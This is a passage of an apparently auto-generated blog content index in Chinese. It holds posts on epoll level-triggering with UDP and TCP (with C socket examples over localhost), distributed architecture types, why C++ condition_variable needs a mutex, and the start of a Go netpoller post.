0);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void connectSocket(int _socket, int _port)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    struct sockaddr_in addr;</span><br><span class=\"line\">    memset(&amp;addr, 0, sizeof(addr));</span><br><span class=\"line\">    addr.sin_family = AF_INET;</span><br><span class=\"line\">    addr.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;);</span><br><span class=\"line\">    addr.sin_port = htons(_port);</span><br><span class=\"line\"></span><br><span class=\"line\">    int ret = connect(_socket,(struct sockaddr*)&amp;addr,sizeof(addr));</span><br><span class=\"line\">    if(ret==-1)&#123;</span><br><span class=\"line\">        printf(&quot;connet ret=%d,errno=%d:%s\\n&quot;,ret,errno,strerror(errno));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    assert(ret == 0);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">void work()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int sock = createServerSocket();</span><br><span class=\"line\">    make_socket_addr_reuse(sock);   </span><br><span class=\"line\">    bindSocket(sock, 777);</span><br><span class=\"line\">    connectSocket(sock,666);</span><br><span class=\"line\"></span><br><span class=\"line\">    write(sock,&quot;12345&quot;,5);</span><br><span class=\"line\">    printf(&quot;send 12345...\\n&quot;);</span><br><span class=\"line\">    sleep(30);</span><br><span class=\"line\">    close(sock);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">int main(int argc, char** argv)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    work();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n<h3 id=\"Work-Fail\"><a href=\"#Work-Fail\" class=\"headerlink\" title=\"Work Fail\"></a>Work Fail</h3><p>我们现在可以来看这个失败的情况了，这个情况就是大名鼎鼎的UDP。</p>\n<p>首先udp server启动</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@localhost reuseport]# ./udp</span><br><span class=\"line\">[epoll thread create. sock = 3]</span><br></pre></td></tr></table></figure>\n\n<p>接着udp client发送字符串</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@localhost]# ./udpclient </span><br><span class=\"line\">sendto 12345...</span><br></pre></td></tr></table></figure>\n\n<p>接着udp server接收到数据，一次接收两个字节，按照预期，将触发3次来接收。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[epoll thread awake. sock = 3]</span><br><span class=\"line\">recv 2 byte[12] from sock 3</span><br></pre></td></tr></table></figure>\n<p>但是它只触发了一次，你是不是怀疑我设置成了边缘触发了，为了验证，我把用来接收的数据的函数直接return，或者把接收的长度设为0，发现就会一直触发，可见水平触发参数设置是成功的。</p>\n<p>所以对于UDP，你只有一次机会去接收数据，这丛它数据报的名字上我们可以方便来理解，一个数据报只能接收一次。</p>\n<p>这就是我这篇文章重点要说的话：</p>\n<p>水平触发在TCP通信中只要没接收完就会一直被触发，在UDP通信中不会！<br>记住，UDP不会！<br>这个结论并不能推翻前面的定义，因为UDP之所以不会多次触发是因为一次read之后缓冲区数据确实就不存在了。</p>\n<h4 id=\"Code-1\"><a href=\"#Code-1\" class=\"headerlink\" title=\"Code\"></a>Code</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">//udp.c</span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\">#include &lt;stdlib.h&gt;</span><br><span class=\"line\">#include &lt;string.h&gt;</span><br><span class=\"line\">#include &lt;assert.h&gt;</span><br><span class=\"line\">#include &lt;errno.h&gt;</span><br><span class=\"line\">#include &lt;sys/types.h&gt;</span><br><span class=\"line\">#include &lt;sys/socket.h&gt;</span><br><span class=\"line\">#include &lt;netinet/in.h&gt;</span><br><span class=\"line\">#include &lt;fcntl.h&gt;</span><br><span class=\"line\">#include &lt;sys/epoll.h&gt;</span><br><span class=\"line\">#include &lt;pthread.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">int createServerSocket()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int sock = socket(AF_INET,SOCK_DGRAM,0);</span><br><span class=\"line\">    assert(sock &gt; 0);</span><br><span class=\"line\">    return sock;    </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void bindSocket(int _socket, int _port)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    struct sockaddr_in     servaddr;</span><br><span class=\"line\">    memset(&amp;servaddr, 0, sizeof(servaddr));</span><br><span class=\"line\">    servaddr.sin_family = AF_INET;</span><br><span class=\"line\">    servaddr.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class=\"line\">    servaddr.sin_port = htons(_port);</span><br><span class=\"line\">    </span><br><span class=\"line\">    int ret = bind(_socket, (struct sockaddr*)&amp;servaddr, sizeof(servaddr));</span><br><span class=\"line\">    assert(ret == 0);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">void make_socket_addr_reuse (int _socket)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    int optval = 1;</span><br><span class=\"line\">    int ret1 = setsockopt(_socket, SOL_SOCKET, SO_REUSEADDR, &amp;optval, sizeof(optval));</span><br><span class=\"line\">    int ret2 = setsockopt(_socket, SOL_SOCKET, SO_REUSEPORT, &amp;optval, sizeof(optval));</span><br><span class=\"line\"></span><br><span class=\"line\">    assert(ret1 == 0);</span><br><span class=\"line\">    assert(ret2 == 0);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void make_socket_non_blocking (int _socket)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  int flags = fcntl (_socket, F_GETFL, 0);</span><br><span class=\"line\">  assert(flags != -1);</span><br><span class=\"line\"></span><br><span class=\"line\">  flags |= O_NONBLOCK;</span><br><span class=\"line\">  int ret = fcntl (_socket, F_SETFL, flags);</span><br><span class=\"line\">  assert(ret == 0);</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">int createEpoll(int _size)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int epollfd = epoll_create(_size);</span><br><span class=\"line\">    assert(epollfd &gt; 0);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void epollClear(int _epoll, int fd)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int ret = epoll_ctl(_epoll, EPOLL_CTL_DEL, fd, NULL);</span><br><span class=\"line\">    assert(0 == ret);   </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void epollAddET(int _epoll, int fd, int mask)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    struct epoll_event epEvent;</span><br><span class=\"line\">    memset(&amp;epEvent, 0,sizeof(epEvent));</span><br><span class=\"line\">    epEvent.data.fd = fd;</span><br><span class=\"line\">    epEvent.events = mask | EPOLLET;</span><br><span class=\"line\">    </span><br><span class=\"line\">    int ret = epoll_ctl(_epoll, EPOLL_CTL_ADD, fd, &amp;epEvent);</span><br><span class=\"line\">    assert(0 == ret);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void epollAddLT(int _epoll, int fd, int mask)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        struct epoll_event epEvent;</span><br><span class=\"line\">        memset(&amp;epEvent, 0,sizeof(epEvent));</span><br><span class=\"line\">        epEvent.data.fd = fd;</span><br><span class=\"line\">        epEvent.events = mask;</span><br><span class=\"line\"></span><br><span class=\"line\">        int ret = epoll_ctl(_epoll, EPOLL_CTL_ADD, fd, &amp;epEvent);</span><br><span class=\"line\">        assert(0 == ret);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int epollwait(int _epoll, struct epoll_event *events, int _maxEvents)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    </span><br><span class=\"line\">    int ret = epoll_wait(_epoll, events, _maxEvents, -1);</span><br><span class=\"line\">    assert(ret &gt; 0);</span><br><span class=\"line\">    </span><br><span class=\"line\">    return ret;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">void handleClientSock(int _epollfd, int clientSock)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    char recv_buffer[2]=&quot;&quot;;</span><br><span class=\"line\">    int bytes = read(clientSock, recv_buffer, sizeof(recv_buffer));</span><br><span class=\"line\">    printf(&quot;recv %d byte[%s] from sock %d\\n&quot;, bytes,recv_buffer, clientSock);</span><br><span class=\"line\">    if(bytes &lt;= 0)&#123;</span><br><span class=\"line\">        //printf(&quot;close sock %d\\n&quot;, clientSock);</span><br><span class=\"line\">        epollClear(_epollfd, clientSock);</span><br><span class=\"line\">        close(clientSock);</span><br><span class=\"line\">        //printf(&quot;[CLOSE SOCKET]=====================\\n&quot;);</span><br><span class=\"line\">    &#125;   </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void* masterThreadBody(void *arg)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int epollfd = createEpoll(100);</span><br><span class=\"line\">    int udpsocket = (int)arg;</span><br><span class=\"line\">    printf(&quot;[epoll thread create. sock = %d]\\n&quot;, udpsocket);</span><br><span class=\"line\">    epollAddLT(epollfd, udpsocket, EPOLLIN);</span><br><span class=\"line\">    </span><br><span class=\"line\">    struct epoll_event fired_events[100];</span><br><span class=\"line\">    while(1)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        int eventCount = epollwait(epollfd, fired_events, 100);</span><br><span class=\"line\">        assert(eventCount &gt; 0);</span><br><span class=\"line\">        </span><br><span class=\"line\">        int i=0;</span><br><span class=\"line\">        for(;i&lt;eventCount;i++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">                printf(&quot;[epoll thread awake. sock = %d]\\n&quot;, fired_events[i].data.fd);</span><br><span class=\"line\">                handleClientSock(epollfd,fired_events[i].data.fd);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    return NULL;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">pthread_t createMasterThread(int udpSock)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    pthread_t tid;</span><br><span class=\"line\">    int ret = pthread_create(&amp;tid,NULL,masterThreadBody,(void*)udpSock);</span><br><span class=\"line\">    assert(ret == 0);</span><br><span class=\"line\">    </span><br><span class=\"line\">    return tid;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">int main(int argc, char** argv)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int sock = createServerSocket();</span><br><span class=\"line\">    make_socket_addr_reuse(sock);</span><br><span class=\"line\">    bindSocket(sock, 666);</span><br><span class=\"line\">    pthread_t tid = createMasterThread(sock);</span><br><span class=\"line\"></span><br><span class=\"line\">    pthread_join(tid, NULL);</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">//udpclient.c</span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\">#include &lt;stdlib.h&gt;</span><br><span class=\"line\">#include &lt;string.h&gt;</span><br><span class=\"line\">#include &lt;assert.h&gt;</span><br><span class=\"line\">#include &lt;errno.h&gt;</span><br><span class=\"line\">#include &lt;sys/types.h&gt;</span><br><span class=\"line\">#include &lt;sys/socket.h&gt;</span><br><span class=\"line\">#include &lt;netinet/in.h&gt;</span><br><span class=\"line\">#include &lt;fcntl.h&gt;</span><br><span class=\"line\">#include &lt;sys/epoll.h&gt;</span><br><span class=\"line\">#include &lt;string.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">int createServerSocket()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int sock = socket(AF_INET,SOCK_DGRAM,0);</span><br><span class=\"line\">    assert(sock &gt; 0);</span><br><span class=\"line\">    return sock;    </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void work()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int sock = createServerSocket();</span><br><span class=\"line\">    </span><br><span class=\"line\">    struct sockaddr_in serverAddress;</span><br><span class=\"line\">    serverAddress.sin_family = AF_INET;</span><br><span class=\"line\">    serverAddress.sin_port = htons(666);</span><br><span class=\"line\">    serverAddress.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;);</span><br><span class=\"line\">    int ret = sendto(sock, &quot;12345&quot;, 5, 0, (struct sockaddr *)&amp;serverAddress, sizeof(serverAddress));</span><br><span class=\"line\">    printf(&quot;sendto 12345...\\n&quot;);</span><br><span class=\"line\">    sleep(30);</span><br><span class=\"line\">    close(sock);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">int main(int argc, char** argv)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    work();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n<p>这些代码也可以给看到的人做一个例子。</p>\n","categories":["代码"],"tags":["西佳佳"]},{"title":"分布式架构的形式","url":"/2017/02/02/distribute/","content":"<h2 id=\"分布式架构形式\"><a href=\"#分布式架构形式\" class=\"headerlink\" title=\"分布式架构形式\"></a>分布式架构形式</h2><h3 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h3><p>如今服务端的架构，开口必提分布式，那么分布式的架构是否有通用的模型或者有一般的规律？<br>有。分布式系统是有几个通用的模型的，一个是集群类型，一个是服务类型。<br>两个都叫分布式，基本也涵盖了绝大多数的分布式架构。我们可以深入了解他们的特点。</p>\n<span id=\"more\"></span>\n\n<h3 id=\"集群类型的组成\"><a href=\"#集群类型的组成\" class=\"headerlink\" title=\"集群类型的组成\"></a>集群类型的组成</h3><p>为什么叫做集群类型，因为这种类型的分布式系统中，每个节点都是相同的，他们拥有相同的功能，提供相同的服务。<br>服务节点：整个分布式体系就是多个功能节点的聚集，可以叫这些节点为服务节点。<br>控制节点：顺势而为得，你可以想到，这些节点是需要一个管理者，就像一个班级的学生，需要一个老师来管理。这个老师节点可以叫做控制节点。<br>然而单个控制节点是不可靠的。没错，控制节点通常都是以主备的形式出现的。</p>\n<p>切换节点：有时候（并不是全部）这种架构下还会有一个不太被注意到的角色，这个角色位于集群之外，通常是一个100%可用的（绝对可靠的）设备或者服务。<br>为什么需要这么个设备呢？ 假想，主控制器crash，于是备用控制器生效，这个时候有两种方式可以完成备用控制器的生效，<br>一种是client事先缓存了主备控制节点的列表，在主控失效后，client就直接连接备控；<br>另一种方案是，借助公司内部一个绝对可用的设备或者服务，该设备感知到主控失效，就把地址切换到备控。<br>这里第二种方案种，就会存在一个这样的角色，可以叫他为切换节点。采用这种方案好处是不用把主备控制节点都暴露给客户端。</p>\n<p>所以一个集群的组成包括成千上万的服务节点+两个控制节点+可能一个切换节点<br><img src=\"/linkimage/distribute/3.png\" alt=\"system composition\"></p>\n<h3 id=\"集群类型的案例\"><a href=\"#集群类型的案例\" class=\"headerlink\" title=\"集群类型的案例\"></a>集群类型的案例</h3><p>集群类型的典型案例是HDFS，这是个分布式文件系统，服务节点是提供文件存储服务，控制节点管理服务节点，并且对外提供目录服务，而主备的切换需要自己增加切换节点，比如利用zookeeper。<br>这个图是hdfs写文件时的流程图，client首先访问控制节点（图中NN），随后根据返回信息再去访问某个或某几个服务节点（图中DN）。这也是所有集群类型的分布式架构运作的基本流程。而图中Switch起切换NN的功能。<br><img src=\"/linkimage/distribute/1.png\" alt=\"HDFS write flow\"><br>（图片来自网络，如果作者希望删除请告知）</p>\n<h3 id=\"服务类型的组成\"><a href=\"#服务类型的组成\" class=\"headerlink\" title=\"服务类型的组成\"></a>服务类型的组成</h3><p>服务类型的架构比较常见的是SOA和微服务，简单点说就是重型服务和轻型服务，两者的差别是，SOA定义了一些规范，包括基于XML以及通过WSDL来描述服务接口。<br>微服务则强调轻量，小而简单，不限定你的服务调用方式，restful,rpc,只要你喜欢就好，而服务也是比较推荐拆成独立而简单的小服务。<br>这样的系统中，每个角色都是一个服务，一个对外提供某种调用方式的服务。就像一个优秀的班级，没有班主任，只有学生，每个学生承担班级运营的一部分责任。<br>所以服务类型的系统组成是N个独立的服务（提供服务注册和发布功能的本身也可以看做是一个服务）。</p>\n<h3 id=\"服务类型的案例\"><a href=\"#服务类型的案例\" class=\"headerlink\" title=\"服务类型的案例\"></a>服务类型的案例</h3><p>下面这个是一个打车系统的微服务架构，整个系统包含8个服务，服务通过restful形式发布，<br><img src=\"/linkimage/distribute/2.png\" alt=\"dache micro service\"><br>（图片来自网络，如果作者希望删除请告知）</p>\n<h3 id=\"集群类型和服务类型的关系\"><a href=\"#集群类型和服务类型的关系\" class=\"headerlink\" title=\"集群类型和服务类型的关系\"></a>集群类型和服务类型的关系</h3><p>集群类型和服务类型是两种架构形式，两个有很大差别，但是他们却是可以共存的，共存的形式是嵌套。<br>比如一个集群类型的架构中，每个节点内部的功能通过微服务的架构来实现。<br>比如一个微服务架构的系统中，某个微服务背后隐藏的一个集群，可是一个集群还叫微服务吗，这样确实比较少见，不过这样子未尝不可，毕竟这也是一个无法拆分下去的功能了。</p>\n<h3 id=\"分布式服务的优点\"><a href=\"#分布式服务的优点\" class=\"headerlink\" title=\"分布式服务的优点\"></a>分布式服务的优点</h3><p>集群类型架构<br>    扩展性，通过加服务节点就可以大量的增加服务能力。<br>    可靠性，由于服务节点有互为备份的关系，整个系统的服务可靠性是非常强的。<br>服务类型架构<br>    扩展性，可以灵活增减服务到这个系统中，灵活给服务分配不同的资源。<br>    可靠性，单个服务的异常被隔离在该服务本身。<br>    独立性，单个服务可以独立部署和测试。</p>\n","categories":["架构"],"tags":["分布式"]},{"title":"condition_variable为什么需要mutex","url":"/2016/11/14/condition/","content":"<h2 id=\"condition-variable\"><a href=\"#condition-variable\" class=\"headerlink\" title=\"condition_variable\"></a>condition_variable</h2><h3 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h3><p>在头文件&lt; condition_variable &gt;中，顾名思义是一个条件变量，主要功能是阻塞线程直到另一个线程把你唤醒。</p>\n<p>条件两个字看起来似乎是指，在另一个线程中满足了条件，才把你唤醒；然而如果仅仅如此的话信号量就能满足要求了。</p>\n<p>所以条件二字更体现在你需要满足更具体的”条件”才能被唤醒。</p>\n<p>来看一个简单的例子：</p>\n<span id=\"more\"></span>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">#include &lt;iostream&gt;             </span><br><span class=\"line\">#include &lt;thread&gt;               </span><br><span class=\"line\">#include &lt;mutex&gt;                </span><br><span class=\"line\">#include &lt;condition_variable&gt;   </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">std::mutex mtx; </span><br><span class=\"line\">std::condition_variable cv; </span><br><span class=\"line\">bool ready = false; </span><br><span class=\"line\"></span><br><span class=\"line\">void wait_ready()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    std::unique_lock &lt;std::mutex&gt; lck(mtx);</span><br><span class=\"line\">\t</span><br><span class=\"line\">    std::cout &lt;&lt; &quot;before wait.&quot; &lt;&lt; std::endl;</span><br><span class=\"line\">    cv.wait(lck,[]()&#123;return ready;&#125;); </span><br><span class=\"line\">\tstd::cout &lt;&lt; &quot;after wait.&quot; &lt;&lt; std::endl;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void make_ready()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    std::unique_lock &lt;std::mutex&gt; lck(mtx);</span><br><span class=\"line\">    ready = true;</span><br><span class=\"line\">\t</span><br><span class=\"line\">    std::cout &lt;&lt; &quot;before notify.&quot; &lt;&lt; std::endl;</span><br><span class=\"line\">    cv.notify_all(); </span><br><span class=\"line\">    std::cout &lt;&lt; &quot;after notify.&quot; &lt;&lt; std::endl;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">int main(int argc, char** argv) &#123;</span><br><span class=\"line\">\tstd::thread wait_t(wait_ready);</span><br><span class=\"line\">\tstd::thread ready_t(make_ready);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\twait_t.join();</span><br><span class=\"line\">\tready_t.join();</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">/*** output:</span><br><span class=\"line\">before wait.</span><br><span class=\"line\">before notify.</span><br><span class=\"line\">after notify.</span><br><span class=\"line\">after wait.</span><br><span class=\"line\">***/</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>可以看到这里wait_ready()等待make_ready()的唤醒后才往下执行。这是condition_variable的典型用法，一边wait一边notify。</p>\n<h3 id=\"wait函数的参数\"><a href=\"#wait函数的参数\" class=\"headerlink\" title=\"wait函数的参数\"></a>wait函数的参数</h3><p>我们一步一步说，wait函数可以有两个参数，第一个参数是一个mutex类型，也就是一个锁；第二个参数是一个返回类型是bool的函数，意思是直到这个函数返回true才往下执行。可以放心的是它不是通过死循环来判断这个条件的，不然还需要另一边notify干嘛。wait会在刚进入时判断这个函数返回值，如果false就睡眠，每次被唤醒后再次判断。</p>\n<p>带来疑问的是第一个参数是否有必要，为什么我们要传入一个锁呢。很多同学说是为了保护类内部的资源，因为可以想象这里面应该会有一个队列存放着所有wait的线程，wait和notify的时候都会来访问这个队列，所以至少这个队列是需要一个锁来保护的。理由都对，结论却不对。内部资源确实是需要保护，但是难道它不能再内部创建一个锁来使用吗，它的实现也确实是用了内部的锁。所以这个lock一定不是用来保护内部的资源。那又是为何呢？</p>\n<h3 id=\"不用锁会遇到什么问题\"><a href=\"#不用锁会遇到什么问题\" class=\"headerlink\" title=\"不用锁会遇到什么问题\"></a>不用锁会遇到什么问题</h3><p>我们只要知道不用锁会遇到的问题也就知道为什么用了。</p>\n<p>我们首先把cv.wait( lck,[](  ){return ready;} );做个等价变换：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">// 如果不使用锁，也就是这样</span><br><span class=\"line\">while(! ready )&#123;</span><br><span class=\"line\">cv.wait()</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>同时另一个线程notify的步骤不受影响</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ready = true;</span><br><span class=\"line\">cv.notify_all();</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>那么如果按先上面再下面的顺序执行，先执行上面的线程，首先 ready为false，进入wait。再执行下面，ready变为true，wait被唤醒，并检查ready，不满足while条件，于是跳出while，线程走下去了。</p>\n<p>再看按照先下面再上面的顺序执行，先下面，ready变成true，然后notify_all，因为没有线程在wait，于是属于空操作；接着上面的线程执行，while条件不满足，于是跳出，线程走下去了。</p>\n<p>没毛病！</p>\n<p>但是你没注意交叉执行的情况：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Process A                             Process B</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">while (！ready)</span><br><span class=\"line\"></span><br><span class=\"line\">                                      ready = true;</span><br><span class=\"line\">                                      cv.notify_all();</span><br><span class=\"line\"></span><br><span class=\"line\">    cv.wait()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<p>看到了吧，这种情况下A线程永远无法走下去，然而从编程者的期待中一定觉得是应该走下去的。</p>\n<p>解决方法也很简单，加锁嘛。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Process A                             Process B</span><br><span class=\"line\"></span><br><span class=\"line\">mtx.lock()</span><br><span class=\"line\">while (！ready)</span><br><span class=\"line\">                                      mtx.lock()</span><br><span class=\"line\">                                      ready = true;</span><br><span class=\"line\">                                      cv.notify_all();</span><br><span class=\"line\">                                      mtx.unlock();</span><br><span class=\"line\"></span><br><span class=\"line\">    cv.wait()</span><br><span class=\"line\">mtx.unlock()</span><br></pre></td></tr></table></figure>\n\n<p>由于你加了锁，上面的顺序是无法发生的，所以这样是安全的。<br>现在我们知道了不能没有锁，下面我们再看看锁怎么用。</p>\n<h3 id=\"用了锁还有什么问题\"><a href=\"#用了锁还有什么问题\" class=\"headerlink\" title=\"用了锁还有什么问题\"></a>用了锁还有什么问题</h3><p>前面加锁的方法真的安全吗？ 并不是，虽然不会交叉执行了，但是却也无法顺序执行了，如果B先拿到锁，接着释放并没什么问题；但是如果A先拿到锁，接着等待，并持续持有锁，此时B无法拿到锁，也就无法唤醒A线程。问题好像更大了。</p>\n<p>这时wait 函数说这个问题我来处理，我可以在进入睡眠状态后把锁释放掉，然后在被唤醒后再把锁抢回来，这样对外部来说是感觉不到锁被释放过的。</p>\n<p>是个好主意，也确实是这么做的，传入锁不是为了加锁而是为了解锁，于是就有了我们把lck传给wait的这个用法。终于弄清楚为什么这么设计了。</p>\n<p>再补充一点，对于如线程B这样的先修改判断条件再notify的过程，加锁不一定要把cv.notify_all加进去，你只要把修改判断条件的放到锁里面就好，notify_all也放锁里当然也没问题。 如果只notify，不改条件，那自然无所谓，不会影响wait的结果。对于要修改条件的，由于涉及到了并发访问了，基本上上锁就对了。</p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>condition_variable 通过wait和notify来达到线程间的同步；</p>\n<p>wait函数可传入条件函数，在首次进入和被唤醒时执行条件函数，返回true才真正被唤醒往下走。</p>\n<p>wait必须传入mutex，这个不是保护类内部资源，而是保护外部的条件函数到睡眠状态的间隙，避免被其他线程打断，丢失唤醒的机会。</p>\n<p>传入wait的mutex在类内部不是一直加着锁也不是一直解开锁，而是先被解锁再被加锁，以让其他线程能有机会得到锁。</p>\n","categories":["代码"],"tags":["西佳佳"]},{"title":"Hello World","url":"/1970/01/01/hello-world/","content":"<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a></p>\n"},{"title":"golang netpoller","url":"/2019/06/08/gonetpoller/","content":"<h1 id=\"Golang-netpoller\"><a href=\"#Golang-netpoller\" class=\"headerlink\" title=\"Golang netpoller\"></a>Golang netpoller</h1><p>本文主要记录go是如何处理网络IO的，以及这么做的目的和原理，穿插一部分源码跟踪。同时对比go的线程模型与别的通用线程模型的差别。</p>\n<h2 id=\"网络阻塞\"><a href=\"#网络阻塞\" class=\"headerlink\" title=\"网络阻塞\"></a>网络阻塞</h2><p>在Go的实现中，所有IO都是阻塞调用的，Go的设计思想是程序员使用阻塞式的接口来编写程序，然后通过goroutine+channel来处理并发。因此所有的IO逻辑都是直来直去的，先xx，再xx,  你不再需要回调，不再需要future，要的仅仅是step by step。这对于代码的可读性是很有帮助的。</p>\n<p>在<a href=\"https://yizhi.ren/2019/06/03/goscheduler/\">go 